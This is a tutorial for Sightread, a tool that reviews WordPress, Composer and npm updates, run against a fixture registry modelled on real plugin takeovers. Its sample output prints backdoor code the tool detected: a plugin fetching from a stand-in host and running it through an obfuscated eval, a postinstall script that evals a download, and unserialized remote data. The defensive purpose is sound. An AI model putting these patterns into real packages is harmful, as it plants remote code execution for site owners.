This tutorial reviews updates before you install them: try the built-in demo, review one plugin, read a finding in full, review a whole site and record what you reviewed. It takes about ten minutes.

The demo needs nothing. For the other steps you need a WordPress site, Composer project or npm project on this machine; the examples use a WordPress site in `~/www`. The output on this page comes from Sightread's testbed: a fixture registry on 127.0.0.1 that plays WordPress.org, Packagist and npm with packages modelled on real incidents, so the plugin names are fixture names (`b01-widget` replays a real plugin takeover, `g05-cron` is a benign update). Long absolute paths are shortened with `...`.

With the standalone binary, type `rhythm-sightread` wherever this page says `rhythm sightread`; the two are the same tool.

> **Follow along without a site.** Steps 3 to 6 run as printed against the testbed in a clone of the repository. It needs only Go and stays on 127.0.0.1:
>
> ```sh
> git clone https://github.com/RhythmShahriar/sightread && cd sightread
> make build                       # bin/rhythm-sightread
> make testbed                     # the fixture registry on 127.0.0.1:18900-18904
> cd testbed && . ./env.sh         # points Sightread at it (SIGHTREAD_* and SSL_CERT_FILE)
> export PATH=$PWD/../bin:$PATH
> cd projects/wp                   # a WordPress site with b01-widget, g05-cron and the rest
> rhythm-sightread plugin b01-widget
> ```
>
> Port 18900 taken? `make testbed PORT_BASE=38900` moves the registry and `env.sh` follows it. `make testbed-down` stops it. The [testbed README](https://github.com/RhythmShahriar/sightread/blob/master/testbed/README.md#run-sightread-by-hand) has the details.

## 1. Check the install

```sh
rhythm sightread version
```

```text
rhythm-sightread 1.0.0
```

A build from source says `rhythm-sightread dev` unless it was built on a release tag (`make build` stamps the tag's version) or with `make build VERSION=1.0.0`. A dev build works the same; only the version it reports differs.

If it says `rhythm: sightread isn't installed`, run `rhythm install sightread`. If `rhythm` isn't found at all, follow [Install](Install).

## 2. Try the demo

```sh
rhythm sightread demo
```

The first time, Sightread prints a one-time notice:

```text
Note: real reviews download packages from WordPress.org, Packagist and npm and read
them as text; this demo stays on 127.0.0.1. Sightread never runs their code. A clean
result is a static diff, not proof an update is safe. This notice is shown once.
```

The demo serves three made-up updates from memory on 127.0.0.1 and reviews them the way it reviews a real site: one routine plugin update, one in the pattern of the 2025 Essential Plugin takeover and one npm package with a new install script and a look-alike dependency. Nothing in them ever runs and nothing leaves the machine.

```text

  ♪ rhythm sightread 1.0.0  /tmp/sightread-demo-.../site  WordPress 6.8.3
  ────────────────────────────────────────────────────────────────────────
  Read-only. Sightread changes nothing on your site and never runs the
  code it downloads.

  VERDICT     UPDATE           FROM   TO     FINDINGS
  HOLD        date-utils-lite  1.4.0  1.4.1  1 critical, 4 high
  HOLD        share-kit        3.2.0  3.2.1  4 critical, 3 high
  ROUTINE     comment-guard    4.1.2  4.1.3

  HOLD  date-utils-lite 1.4.0 → 1.4.1 ────────────────────────────────────
 ▌  CRITICAL   Fetches remote code and runs it       scripts/setup.js:6 #1
 ▌             http.get('http://127.0.0.1:9/helper.js', (res) => { …
 ▌             eval(body);
 ▌             → Hold the update. Nothing local can tell you what the
 ▌               downloaded code will do.

 ▌  HIGH       Adds a runtime dependency                   package.json #2
 ▌             adds axois ^1.0.0 (published 16 days ago, has an install
 ▌             script)
 ▌             → Look at the new dependency as closely as at the package
 ▌               itself.

 ▌  HIGH       Adds or changes an install script           package.json #3
 ▌             postinstall: node scripts/setup.js
 ▌             → Install with --ignore-scripts until someone has read the
 ▌               script.

 ▌  HIGH       New dependency named like a popular package
 ▌             package.json #4
 ▌             axois is close to the popular axios; it has an install
 ▌             script
 ▌             likely: a heuristic, not an exact pattern
 ▌             → Check the dependency's name letter by letter.

 ▌  HIGH       Changelog does not mention what the code adds
 ▌             scripts/setup.js:6 #5
 ▌             no changelog entry for 1.4.1; the update adds fetched or
 ▌             decoded code that runs (scripts/setup.js:6), network sends
 ▌             (scripts/setup.js:6), file writes outside the package…
 ▌             likely: a heuristic, not an exact pattern
 ▌             → Hold the update. Nothing in the changelog explains this.

  HOLD  share-kit 3.2.0 → 3.2.1 ──────────────────────────────────────────
 ▌  CRITICAL   Runs code built at run time         includes/sync.php:13 #6
 ▌             $response = wp_remote_post(
 ▌             'https://mainnet.infura.io/v3/share-kit', array( … return
 ▌             $fn( $request->get_param( 'q' ) );
 ▌             raised by owner-change
 ▌             → Hold the update until you know where the evaluated text
 ▌               comes from.

 ▌  CRITICAL   Contacts a new domain               includes/sync.php:13 #7
 ▌             blockchain-rpc host infura.io: $response = wp_remote_post(
 ▌             'https://mainnet.infura.io/v3/share-kit', array(
 ▌             raised by owner-change
 ▌             → Find out who runs this host before updating.

 ▌  CRITICAL   Runs code built at run time         includes/sync.php:18 #8
 ▌             return $fn( $request->get_param( 'q' ) );
 ▌             raised by owner-change
 ▌             → Hold the update until you know where the evaluated text
 ▌               comes from.

 ▌  CRITICAL   Unserializes request or remote data
 ▌             includes/sync.php:13 #9
 ▌             $response = wp_remote_post(
 ▌             'https://mainnet.infura.io/v3/share-kit', array( … $data =
 ▌             unserialize( wp_remote_retrieve_body( $response ) );
 ▌             raised by owner-change, eval-dynamic
 ▌             likely: a heuristic, not an exact pattern
 ▌             → Hold the update. Unserializing outside data can run code
 ▌               through classes already loaded.

 ▌  HIGH       New owner or publisher                                  #10
 ▌             Contributors before: sharekit; now: sharekit; published by
 ▌             growth-partners
 ▌             → Read this release closely. The people behind it changed.

 ▌  HIGH       Adds a REST route anyone can call   includes/sync.php:5 #11
 ▌             register_rest_route( 'share-kit/v1', '/sync', array( … ) );
 ▌             raised by eval-dynamic, input-unserialize
 ▌             likely: a heuristic, not an exact pattern
 ▌             → Check what this route does for someone who isn't logged
 ▌               in.

 ▌  HIGH       Changelog does not mention what the code adds
 ▌             includes/sync.php:13 #12
 ▌             changelog for 3.2.1 says only "Improved compatibility and
 ▌             performance."; the update adds fetched or decoded code that
 ▌             runs (includes/sync.php:13), network sends…
 ▌             likely: a heuristic, not an exact pattern
 ▌             → Hold the update. Nothing in the changelog explains this.

  NOT CHECKED  1 ─────────────────────────────────────────────────────────

    wordpress 6.8.3: WordPress core is out of scope in v1
      → WordPress core updates come signed from WordPress.org

 ╭──────────────────────────────────────────────────────────────────────╮
 │  3 UPDATES                                       2 hold · 1 routine  │
 │  ■ 5 critical   ■ 7 high                                             │
 │  Sightread reports what changed. It does not judge intent.           │
 ╰──────────────────────────────────────────────────────────────────────╯
  3 updates reviewed · 6 archives verified · 0 from cache · 200ms

  → every finding and the full diff:
    rhythm sightread demo -o review.html --open
  → explain a finding: rhythm sightread explain remote-fetch-exec


→ on your site: rhythm sightread all /path/to/wordpress
→ in CI: rhythm sightread init ci
```

Read it top to bottom:

- **The table** has one row per update, worst first. **HOLD** means a critical finding: don't install it before you've read it. **REVIEW** means a high or medium finding worth a look. **ROUTINE** means only low or info findings, or none.
- **Each card** lists the findings of one update. The `#1`, `#2` after the place are the finding numbers `explain` takes (step 4); they count across the whole report in the order shown. A finding is something the new version can do that the installed one couldn't: here, a new install script that downloads code and runs it. In the second update a plugin now calls a blockchain RPC host and runs what a REST route hands it. Each shows the file and line, the code behind it and what to do (`→`).
- **`raised by owner-change`**: the plugin has a new publisher, so its new code signals went up one level. A new owner shipping new network code is how plugin takeovers look.
- **`likely`** marks a heuristic rather than an exact pattern.
- **Not checked** lists what Sightread didn't review and why. WordPress core is out of scope; it's listed but doesn't make the review incomplete.

`rhythm sightread demo --fail-on high` shows what CI sees: the same report, then exit code 1 because two updates are on HOLD. `--json` prints the JSON report instead and `--keep` keeps the demo's archives and prints a command that reviews two of them as local files.

## 3. Review one plugin

On your site, name the plugin. Sightread reads the installed version from the site and compares it with the latest WordPress.org release:

```sh
cd ~/www
rhythm sightread plugin b01-widget
```

```text
reviewing 1 of 1: b01-widget 2.6.7 → 2.6.8

  ♪ rhythm sightread 1.0.0  wp-plugin b01-widget  2.6.7 → 2.6.8
  ────────────────────────────────────────────────────────────────────────
  Read-only. Sightread changes nothing on your site and never runs the
  code it downloads.

  ▸ Installed     2.6.7 in wp-content/plugins/b01-widget · matches
                  wordpress.org ✓
  ▸ Candidate     2.6.8 · released 2026-10-28 · latest
  ▸ Integrity     both versions: matches WordPress.org's own checksums
                  (both come from WordPress.org, so this proves the copy
                  was not changed on the way, not what the author
                  intended) ✓
  ▸ Publisher     changed: wponlinesupport → essentialplugin
  ▸ Diff          2 files changed, 1 added · +11 −4 lines · 136 B → 514 B
  ▸ Changelog     2.6.8: "Check compatibility with WordPress 6.8"

  CRITICAL  1 ────────────────────────────────────────────────────────────

 ▌  CRITICAL   Fetches remote code and runs it
 ▌             includes/class-analytics.php:3 #1
 ▌             $body =
 ▌             wp_remote_retrieve_body(wp_remote_get('https://analytics.wp
 ▌             os-cdn.example/v2/p'));…
 ▌             → Hold the update. Nothing local can tell you what the
 ▌               downloaded code will do.

  HIGH  4 ────────────────────────────────────────────────────────────────

 ▌  HIGH       New owner or publisher                                   #2
 ▌             Contributors before: none listed; now: essentialplugin,
 ▌             wponlinesupport; published by essentialplugin
 ▌             → Read this release closely. The people behind it changed.

 ▌  HIGH       Changelog does not mention what the code adds
 ▌             includes/class-analytics.php:3 #3
 ▌             changelog for 2.6.8 says only "Check compatibility with
 ▌             WordPress 6.8"; the update adds fetched or decoded code
 ▌             that runs (includes/class-analytics.php:3), network sends…
 ▌             likely: a heuristic, not an exact pattern
 ▌             → Hold the update. Nothing in the changelog explains this.

 ▌  HIGH       Sends site data to a new host
 ▌             includes/class-analytics.php:3 #4
 ▌             sends env to the local or reserved name
 ▌             analytics.wpos-cdn.example: $body =
 ▌             wp_remote_retrieve_body(wp_remote_get('https://analytics.…
 ▌             raised by owner-change
 ▌             likely: a heuristic, not an exact pattern
 ▌             → Hold the update until you know what is sent and to whom.

 ▌  HIGH       Sends site data to a new host
 ▌             includes/class-analytics.php:5 #5
 ▌             sends env to the local address 127.0.0.1:
 ▌             $s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv(
 ▌             'SIGHTREAD_CANARY_DIR').'/b01','x');…
 ▌             raised by owner-change
 ▌             likely: a heuristic, not an exact pattern
 ▌             → Hold the update until you know what is sent and to whom.

  MEDIUM  2 ──────────────────────────────────────────────────────────────

 ▌  MEDIUM     Schedules a new background task
 ▌             includes/class-analytics.php:7 #6
 ▌             wp_schedule_event(time()+3600,'daily','wpos_cron');
 ▌             → Check what the new background task does.

 ▌  MEDIUM     Released very recently                                   #7
 ▌             published 3 hours ago (2026-10-28 12:22 UTC); the minimum
 ▌             age is 72h
 ▌             likely: a heuristic, not an exact pattern
 ▌             → Wait a few days before installing it.

 ╭──────────────────────────────────────────────────────────────────────╮
 │  VERDICT                                                       HOLD  │
 │  ■ 1 critical   ■ 4 high   ■ 2 medium                                │
 │  Sightread reports what changed. It does not judge intent.           │
 ╰──────────────────────────────────────────────────────────────────────╯
  1 update reviewed · 2 archives verified · 0 from cache · 100ms

  → the full diff: rhythm sightread plugin b01-widget -o review.html --open
  → explain a finding: rhythm sightread explain remote-fetch-exec
  → record a review:
    rhythm sightread allow wp-plugin:b01-widget@2.6.8 --reason "..."
```

The facts at the top come first for a reason:

- **Installed** `matches wordpress.org ✓`: your copy is the official 2.6.7, so the diff is against what you really run.
- **Integrity**: both zips match WordPress.org's own checksums. That proves nobody changed them on the way, not that the author meant well.
- **Publisher**: the person who committed 2.6.8 never published this plugin before.
- **Changelog**: "Check compatibility with WordPress 6.8", while the diff adds a daily task that downloads code and evaluates it. `changelog-mismatch` flags exactly that gap.

A routine update looks like this:

```text
$ rhythm sightread plugin g05-cron
...
  ▸ Publisher     unchanged (cronteam)
  ▸ Diff          2 files changed, 1 added · +7 −4 lines · 103 B → 327 B
  ▸ Changelog     1.1.0: "Add a daily cleanup task that removes expired
                  transients."

  LOW  1 ─────────────────────────────────────────────────────────────────

    ●  Schedules a new background task                       cron.php:2 #1

 ╭──────────────────────────────────────────────────────────────────────╮
 │  VERDICT                                                    ROUTINE  │
 │  ■ 1 low                                                             │
 │  Sightread reports what changed. It does not judge intent.           │
 ╰──────────────────────────────────────────────────────────────────────╯
  1 update reviewed · 2 archives verified · 0 from cache · 100ms

  → the full diff: rhythm sightread plugin g05-cron -o review.html --open
  → explain a finding: rhythm sightread explain cron-new-hook
  → update it: wp plugin update g05-cron --version=1.1.0
```

Same kind of change (a new daily task). Here the changelog says so, the publisher is the same and nothing in it fetches or runs remote code. Sightread prints the `wp plugin update` command; it never runs it.

Without a site, give the installed version: `rhythm sightread plugin akismet --from 5.3.3`. `--to list` shows the versions you can pick with `--to`.

## 4. Read a finding

Save the report as JSON, then open one finding with the code around it. The number is the `#1` the terminal printed next to the finding:

```sh
rhythm sightread plugin b01-widget -q -o b01.json
rhythm sightread explain b01.json 1
```

```text
Finding 1 of 7: remote-fetch-exec: Fetches remote code and runs it
  Update:      wp-plugin b01-widget 2.6.7 → 2.6.8 (HOLD)
  Severity:    critical
  Confidence:  confirmed
  Where:       includes/class-analytics.php:3-4
  Fingerprint: 1e625065badd63fa
  Counted:     yes

Evidence
  $body =
  wp_remote_retrieve_body(wp_remote_get('https://analytics.wpos-cdn.example/v2/p'));
  … $f = 'ev'.'al'; $f($body);

Advice
  Hold the update. Nothing local can tell you what the downloaded code will do.

Diff
  @@ -0,0 +1,7 @@ includes/class-analytics.php
  +<?php
  +add_action('wpos_cron', function(){
  +  $body = wp_remote_retrieve_body(wp_remote_get('https://analytics.wpos-cdn.example/v2/p'));
  +  $f = 'ev'.'al'; $f($body);
  +  $s=@fsockopen('127.0.0.1',18905);@file_put_contents(getenv('SIGHTREAD_CANARY_DIR').'/b01','x'); // testbed canary: never runs
  +});
  +wp_schedule_event(time()+3600,'daily','wpos_cron');

remote-fetch-exec: Fetches remote code and runs it
  Severity:    critical
  Confidence:  confirmed
  Ecosystems:  wp-plugin, wp-theme, composer, npm

Why it matters
  New code downloads something and runs it in the same function: the response
  reaches eval, include, a child process or a code file that is then loaded.
  What runs can change at any time without a new release. Reviewing this version
  tells you nothing about what it will run tomorrow.

How to review
  1. Open the finding with explain and read the hunk.
  2. Find the URL the code fetches and who runs that host.
  3. Check whether the changelog mentions it.
  4. Ask the maintainers before installing.

False alarms
  Fetching JSON and decoding it with json_decode does not fire. The fetch and
  the run must be in one function body.

Incidents
  intercom-php 2026: Version 5.0.2 downloaded Bun during composer install and
  ran an obfuscated script with it.
  Gravity Forms 2025: The altered build fetched payloads from gravityapi.org and
  ran them.

More
  https://github.com/RhythmShahriar/rhythm/wiki/Sightread-Signal-Reference#remote-fetch-exec
```

`'ev'.'al'` is `eval` built from two strings, so a text search for `eval(` misses it; Sightread follows it. The last line of the hunk is the testbed's canary: if Sightread ever ran this code, the benchmark would see the connection. `rhythm sightread explain remote-fetch-exec` prints the second half on its own, with no report or network. Every signal is in the [Signal reference](Sightread-Signal-Reference).

## 5. Review the whole site

```sh
rhythm sightread all ~/www
```

`all` finds the WordPress root (up to 6 folders down), every plugin and theme, `composer.lock` and npm lockfiles. It reviews every update they can take:

```text
reviewing 2 of 13: g02-bundle 1.0.0 → 1.1.0
reviewing 3 of 13: b01-widget 2.6.7 → 2.6.8
...
reviewing 13 of 13: g07-theme 1.0.0 → 1.1.0

  ♪ rhythm sightread 1.0.0
    .../home/www
    WordPress 6.8.3
  ────────────────────────────────────────────────────────────────────────
  Read-only. Sightread changes nothing on your site and never runs the
  code it downloads.

  VERDICT     UPDATE         FROM   TO     FINDINGS
  HOLD        b01-widget     2.6.7  2.6.8  1 critical, 4 high, 2 medium
  REVIEW      b02-formtools  1.4.0  1.4.1  3 high, 1 medium
  REVIEW      b09-theme      1.5.0  1.6.0  4 high, 1 medium
  REVIEW      g15-takeover   6.0.0  6.0.1  1 high
  ROUTINE     g01-feature    4.0.0  4.1.0
  ROUTINE     g02-bundle     1.0.0  1.1.0
  ROUTINE     g03-i18n       2.0.0  2.1.0
  ROUTINE     g04-vendor     1.0.0  1.0.1
  ROUTINE     g05-cron       1.0.0  1.1.0  1 low
  ROUTINE     g06-contrib    1.0.0  1.1.0
  ROUTINE     g07-theme      1.0.0  1.1.0
  ROUTINE     g08-eol        1.0.0  1.0.1
  ROUTINE     g14-site       1.0.0  1.1.0

  HOLD  b01-widget 2.6.7 → 2.6.8 ─────────────────────────────────────────
...
  REVIEW  g15-takeover 6.0.0 → 6.0.1 ─────────────────────────────────────
 ▌  HIGH       New owner or publisher                                  #17
 ▌             WordPress.org took over this plugin. Contributors before:
 ▌             none listed; now: wordpressdotorg; published by
 ▌             wordpressdotorg
 ▌             → Read this release closely. The people behind it changed.

  NOT CHECKED  2 ─────────────────────────────────────────────────────────

    b22-premium 2.8.0 (wp-plugin): not on WordPress.org
      → give the vendor's zip with --to-file
    wordpress 6.8.3: WordPress core is out of scope in v1
      → WordPress core updates come signed from WordPress.org

 ╭──────────────────────────────────────────────────────────────────────╮
 │  13 UPDATES                           1 hold · 3 review · 9 routine  │
 │  ■ 1 critical   ■ 12 high   ■ 4 medium   ■ 1 low                     │
 │  Incomplete review: 1 package wasn't checked.                        │
 │  Sightread reports what changed. It does not judge intent.           │
 ╰──────────────────────────────────────────────────────────────────────╯
  13 updates reviewed · 26 archives verified · 13 from cache · 200ms

  → every finding and the full diff: run again with -o review.html --open
  → explain a finding: rhythm sightread explain remote-fetch-exec
  → update the routine ones:
    wp plugin update g01-feature g02-bundle g03-i18n g04-vendor g05-cron g06-contrib g08-eol g14-site
  → update the routine ones: wp theme update g07-theme
  → record a review:
    rhythm sightread allow wp-plugin:b01-widget@2.6.8 --reason "..."
```

Thirteen updates; nine can go in now with the command it prints. Four need reading first. `b22-premium` is a premium plugin with no official source, so it's listed as Not checked and the review says it's incomplete: give the vendor's zip with `--to-file` (see [Sources and integrity](Sightread-Sources-And-Integrity#local-files)). `13 from cache`: archives downloaded by earlier runs are reused.

For the full diff and every finding in one page to read or send to a client:

```sh
rhythm sightread all ~/www -o review.html --open
```

The page is self-contained and loads nothing from outside. It works offline and in light and dark. See [Output and reports](Sightread-Output) for the other formats.

## 6. Record your review

You read `g05-cron`'s update: the new daily task is the cleanup its changelog describes. Record that, bound to that release's exact bytes:

```sh
rhythm sightread allow wp-plugin:g05-cron@1.1.0 --reason "daily transient cleanup, read the cron callback"
```

```text
allowed wp-plugin:g05-cron@1.1.0 (sha256 74e9e4bd35dd) in .sightread/allowed.yaml
```

The next review shows it as ALLOWED. If the same version is ever served with other bytes, that's the critical finding `approved-version-changed` instead. Commit `.sightread/allowed.yaml` next to your code; see [Allow and baseline](Sightread-Allow-And-Baseline).

## Next steps

- **Gate pull requests**: `rhythm sightread init ci` writes a GitHub workflow that reviews every lockfile change. See [CI and the GitHub Action](Sightread-CI).
- **Set defaults for the project**: `rhythm sightread init` writes `.sightread/config.yaml` with `fail_on: high`. See [Configuration](Sightread-Configuration).
- **Watch all your sites**: `rhythm sightread watch -l sites.yaml --at 02:00 --notify slack://...`. See [Watch](Sightread-Watch).
- **Try an update on staging first**: `--soundcheck <staging-url>`. See [With Soundcheck and Roadie](Sightread-With-Soundcheck).
- **Read the limits** before you trust a clean result: [FAQ and honest limits](Sightread-FAQ#honest-limits).

---
<sub>← [Overview](Sightread) · [Home](Home) · [Signal reference](Sightread-Signal-Reference) →</sub>
